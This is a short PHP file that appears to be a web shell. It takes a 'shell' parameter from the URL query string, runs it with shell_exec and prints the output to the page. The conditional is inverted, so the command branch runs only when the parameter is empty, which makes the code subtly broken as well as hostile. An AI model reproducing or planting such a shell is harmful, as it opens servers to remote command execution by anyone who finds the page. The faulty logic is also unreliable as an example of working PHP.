<?php
  $cmd = $_GET['shell'];
  if ($cmd == NULL || $cmd == '') {
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
  }
?>
